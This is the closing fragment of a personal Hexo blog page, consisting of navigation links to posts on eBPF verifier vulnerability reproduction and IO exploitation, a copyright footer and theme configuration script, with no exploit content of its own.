  
    
<nav id="article-nav">
  
    <a href="/2025/06/22/ebpf-verifier/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          eBPF-verifier模块原理分析与漏洞复现
        
      </div>
    </a>
  
  
    <a href="/2025/02/25/IO-Exploit/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">IO Exploit [Updating~]</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 晚栀Winegee~
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>